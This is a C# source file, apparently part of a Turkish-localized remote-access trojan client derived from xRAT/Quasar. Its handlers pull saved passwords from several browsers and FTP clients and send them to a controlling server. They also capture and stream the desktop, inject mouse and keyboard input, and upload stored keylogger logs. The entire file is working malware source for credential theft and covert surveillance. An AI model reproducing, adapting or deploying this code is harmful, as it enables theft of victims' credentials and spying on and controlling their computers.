using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.KuuhakuÇekirdek.Yardımcılar;
using System.Drawing.Imaging;
using System.Threading;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Utilityler;
using xClient.Enumlar;
using System.Collections.Generic;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Kurtarma.Tarayıcılar;
using xClient.KuuhakuÇekirdek.Kurtarma.FtpClients;

namespace xClient.KuuhakuÇekirdek.Eylemler
{
    public static partial class Eylemİşleyicisi
    {
        public static void HandleGetPasswords(Paketler.ServerPaketleri.GetPasswords packet, Client client)
        {
            List<KurtarılanHesaplar> recovered = new List<KurtarılanHesaplar>();

            recovered.AddRange(Chrome.GetSavedPasswords());
            recovered.AddRange(Opera.GetSavedPasswords());
            recovered.AddRange(Yandex.GetSavedPasswords());
            recovered.AddRange(InternetExplorer.GetSavedPasswords());
            recovered.AddRange(Firefox.GetSavedPasswords());
            recovered.AddRange(FileZilla.GetSavedPasswords());
            recovered.AddRange(WinSCP.GetSavedPasswords());

            List<string> raw = new List<string>();

            foreach (KurtarılanHesaplar value in recovered)
            {
                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.Url, value.Application, Antilimiter);
                raw.Add(rawValue);
            }

            new Paketler.ClientPaketleri.GetPasswordsResponse(raw).Execute(client);
        }

        public static void HandleGetDesktop(Paketler.ServerPaketleri.GetDesktop command, Client client)
        {
            var resolution = FormatYardımcısı.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));

            if (StreamCodec == null)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);

            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor
                || StreamCodec.Resolution != resolution)
            {
                if (StreamCodec != null)
                    StreamCodec.Dispose();

                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(command.Monitor);
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (StreamCodec == null) throw new Exception("StreamCodec 0 olamaz.");
                    StreamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    new Paketler.ClientPaketleri.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                        StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
                }
            }
            catch (Exception)
            {
                if (StreamCodec != null)
                    new Paketler.ClientPaketleri.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
                        StreamCodec.Resolution).Execute(client);

                StreamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }

        public static void HandleDoMouseEvent(Paketler.ServerPaketleri.DoMouseEvent command, Client client)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[command.MonitorIndex].Bounds.X;
                int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
                Point p = new Point(command.X + offsetX, command.Y + offsetY);

                switch (command.Action)
                {
                    case FareEylemleri.SolAşağı:
                    case FareEylemleri.SolYukarı:
                        NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
                        break;
                    case FareEylemleri.SağAşağı:
                    case FareEylemleri.SağYukarı:
                        NativeMethodsHelper.DoMouseRightClick(p, command.IsMouseDown);
                        break;
                    case FareEylemleri.ImleçOynat:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case FareEylemleri.AşağıTekerlek:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case FareEylemleri.YukarıTekerlek:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch
            {
            }
        }

        public static void HandleDoKeyboardEvent(Paketler.ServerPaketleri.DoKeyboardEvent command, Client client)
        {
            NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
        }

        public static void HandleGetMonitors(Paketler.ServerPaketleri.GetMonitors command, Client client)
        {
            if (Screen.AllScreens.Length > 0)
            {
                new Paketler.ClientPaketleri.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
            }
        }

        public static void HandleGetKeyloggerLogs(Paketler.ServerPaketleri.GetKeyloggerLogs command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;

                    if (!Directory.Exists(Keylogger.LogDirectory))
                    {
                        new Paketler.ClientPaketleri.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        new Paketler.ClientPaketleri.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                            new Paketler.ClientPaketleri.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new Paketler.ClientPaketleri.GetKeyloggerLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                                //Thread.Sleep(200); ???
                            }
                            else
                                new Paketler.ClientPaketleri.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    new Paketler.ClientPaketleri.GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
                }
            }).Start();
        }
    }
}